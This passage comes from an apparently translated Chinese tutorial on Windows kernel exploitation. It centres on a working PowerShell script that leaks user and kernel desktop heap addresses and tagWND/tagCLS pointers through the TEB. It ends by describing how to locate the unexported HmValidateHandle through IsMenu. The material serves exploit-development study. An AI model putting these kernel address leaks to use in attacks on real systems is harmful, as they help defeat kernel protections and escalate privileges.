
```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
[StructLayout(LayoutKind.Sequential)]
public struct \_THREAD\_BASIC\_INFORMATION
{
public IntPtr ExitStatus;
public IntPtr TebBaseAddress;
public IntPtr ClientId;
public IntPtr AffinityMask;
public IntPtr Priority;
public IntPtr BasePriority;
}
public class DesktopHeapGDI
{
delegate IntPtr WndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);
[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
struct WNDCLASS
{
public uint style;
public IntPtr lpfnWndProc;
public int cbClsExtra;
public int cbWndExtra;
public IntPtr hInstance;
public IntPtr hIcon;
public IntPtr hCursor;
public IntPtr hbrBackground;
[MarshalAs(UnmanagedType.LPWStr)]
public string lpszMenuName;
[MarshalAs(UnmanagedType.LPWStr)]
public string lpszClassName;
}
[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
static extern System.UInt16 RegisterClassW(
[System.Runtime.InteropServices.In] ref WNDCLASS lpWndClass
);
[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
static extern IntPtr CreateWindowExW(
UInt32 dwExStyle,
[MarshalAs(UnmanagedType.LPWStr)]
string lpClassName,
[MarshalAs(UnmanagedType.LPWStr)]
string lpWindowName,
UInt32 dwStyle,
Int32 x,
Int32 y,
Int32 nWidth,
Int32 nHeight,
IntPtr hWndParent,
IntPtr hMenu,
IntPtr hInstance,
IntPtr lpParam
);
[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
static extern System.IntPtr DefWindowProcW(
IntPtr hWnd,
uint msg,
IntPtr wParam,
IntPtr lParam
);
[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
static extern bool DestroyWindow(
IntPtr hWnd
);
[DllImport("ntdll.dll")]
public static extern int NtQueryInformationThread(
IntPtr hThread,
int ThreadInfoClass,
ref \_THREAD\_BASIC\_INFORMATION ThreadInfo,
int ThreadInfoLength,
ref int ReturnLength);
[DllImport("kernel32.dll")]
public static extern IntPtr GetCurrentThread();
[DllImport("kernel32.dll", SetLastError = true)]
public static extern void DebugBreak();
private IntPtr m\_hwnd;
public IntPtr CustomWindow(string class\_name, string menu\_name)
{
m\_wnd\_proc\_delegate = CustomWndProc;
WNDCLASS wind\_class = new WNDCLASS();
wind\_class.lpszClassName = class\_name;
wind\_class.lpszMenuName = menu\_name;
wind\_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m\_wnd\_proc\_delegate);
UInt16 class\_atom = RegisterClassW(ref wind\_class);
m\_hwnd = CreateWindowExW(
0,
class\_name,
String.Empty,
0,
0,
0,
0,
0,
IntPtr.Zero,
IntPtr.Zero,
IntPtr.Zero,
IntPtr.Zero
);
return m\_hwnd;
}
private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
{
return DefWindowProcW(hWnd, msg, wParam, lParam);
}
private WndProc m\_wnd\_proc\_delegate;
}
"@
#------------------[Create Window]
# Call nonstatic public method => delegWndProc
$DesktopHeapGDI = New-Object DesktopHeapGDI
# Menu name buffer
$Buff = "A"\*0x8F0
$Handle = $DesktopHeapGDI.CustomWindow("TestWindow",$Buff)
#$Handle.ToInt64()
echo "`n[+] Window handle: $Handle"
#------------------[Leak Desktop Heap]
# Pseudo handle => -2
$CurrentHandle = [DesktopHeapGDI]::GetCurrentThread()
# ThreadBasicInformation
$THREAD\_BASIC\_INFORMATION = New-Object \_THREAD\_BASIC\_INFORMATION
$THREAD\_BASIC\_INFORMATION\_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($THREAD\_BASIC\_INFORMATION)
$RetLen = New-Object Int
$CallResult = [DesktopHeapGDI]::NtQueryInformationThread($CurrentHandle,0,[ref]$THREAD\_BASIC\_INFORMATION,$THREAD\_BASIC\_INFORMATION\_SIZE,[ref]$RetLen)
$TEBBase = $THREAD\_BASIC\_INFORMATION.TebBaseAddress
$TEB\_Win32ClientInfo = [Int64]$TEBBase+0x800
$TEB\_UserKernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64([Int64]$TEBBase+0x828)
$TEB\_KernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB\_UserKernelDesktopHeap+0x28)
$ulClientDelta = $TEB\_KernelDesktopHeap - $TEB\_UserKernelDesktopHeap
echo "`n[+] \_TEB.Win32ClientInfo: $('{0:X16}' -f $TEB\_Win32ClientInfo)"
echo "[+] User Mapped Desktop Heap: $('{0:X16}' -f $TEB\_UserKernelDesktopHeap)"
echo "[+] Kernel Desktop Heap: $('{0:X16}' -f $TEB\_KernelDesktopHeap)"
echo "[+] ulClientDelta: $('{0:X16}' -f $ulClientDelta)"
#------------------[Parse User Desktop Heap]
echo "`n[+] Parsing Desktop heap.."
for ($i=0;$i -lt 0xFFFFF;$i=$i+8) {
$ReadHandle = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB\_UserKernelDesktopHeap + $i)
if ($ReadHandle -eq $Handle.ToInt64()) {
echo "[!] w00t, found handle!"
$UsertagWND = $TEB\_UserKernelDesktopHeap + $i
$KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($UsertagWND + 0xa8)
break
}
}
echo "`n[+] User tagWND: $('{0:X16}' -f $($UsertagWND))"
echo "[+] User tagCLS: $('{0:X16}' -f $($KerneltagCLS-$ulClientDelta))"
echo "[+] Kernel tagWND: $('{0:X16}' -f $($UsertagWND+$ulClientDelta))"
echo "[+] Kernel tagCLS: $('{0:X16}' -f $($KerneltagCLS))"
echo "[+] Kernel tagCLS.lpszMenuName: $('{0:X16}' -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+0x90)))`n"
#------------------[Break]
Start-Sleep -s 20
[DesktopHeapGDI]::DebugBreak()
```

这种读操作没什么问题，我们立即得到了下面的反馈结果。注意到`PowerShell`提示符没有返回，这是因为我们需要在`script`退出前断下来。

![](upload/attach/201803/530966\_G5KQBMNVVQXB3SK.jpg)

在`KD`中用`dq`/`db`来看看我们成功计算出的所有相对偏移。

![](upload/attach/201803/530966\_URYRHJ5JS8SS3TE.jpg)

## Leak 2 => `User32::HmValidateHandle`

`HmValidateHandle`第一次被使用是在2011年 <a href="elink@92fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2J5L8X3g2D9M7r3!0G2L8l9`.`.">@kernelpool</a>攥写的论文 <a href="elink@408K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6j5g2)9J5k6h3u0D9j5h3y4C8K9r3q4@1i4K6u0W2j5$3!0E0i4K6u0r3j5X3S2Q4x3X3c8#2M7#2)9J5k6o6p5I4i4K6u0r3e0h3q4F1k6s2c8Q4x3V1k6n7d9q4)9#2k6W2g2e0i4K6g2X3x3e0q4Q4y4h3k6y4j5h3&6V1N6q4)9#2k6Y4N6A6L8U0x3J5K9#2)9#2k6W2N6b7i4K6u0W2M7r3c8X3">Kernel Attacks through User-Mode Callbacks</a>中提出的，随后不久这一技术就被用在了各种`exp`中，包括`CVE-2016-7255` <a href="elink@7e3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2@1M7X3g2F1k6r3#2A6j5%4u0G2i4K6u0W2j5$3!0E0i4K6u0r3N6s2u0W2L8X3c8D9j5h3u0K6i4K6u0V1M7$3g2U0N6i4u0A6N6s2W2Q4x3X3c8A6L8Y4c8W2L8r3I4A6k6$3g2F1j5$3g2Q4x3V1k6G2L8X3g2Q4x3X3c8T1K9i4c8Q4x3X3c8J5N6h3I4W2i4K6u0V1M7%4W2K6N6r3g2E0i4K6u0V1j5h3&6S2L8s2W2\*7K9h3&6Y4i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4y4W2)9J5k6o6M7J5y4e0g2Q4x3X3c8W2P5s2m8D9L8$3W2@1i4K6u0V1N6$3W2D9k6q4)9J5c8R3`.`.">as exploited by Fancy Bear</a>。

`HmValidateHandle`是一个很有意思的函数，我们可以提供一个`Window`句柄给它，它会返回桌面堆上用户映射的`tagWND`对象，这简直太好用了！通过这种方式我们可以获取完整的`TEB`解析和爆破。唯一的问题在于`HmValidateHandle`并未被`user32`导出，所以我们需要一些技巧来获取它的地址。

从一大堆公开的解释中我们发现`HmValidateHandle`与导出的`User32::IsMenu`函数最近，让我在`KD`中看看。

![](upload/attach/201803/530966\_Y2GVUYNM5HNPJGT.jpg)

确实不痛不痒！我们需要做的就是获取`User32::IsMenu`运行时地址，寻找第一个`0xE8`字节(`call xxx`)并攫取出`HmValidateHandle`的指针。我们可以利用下面的一段代码实现。
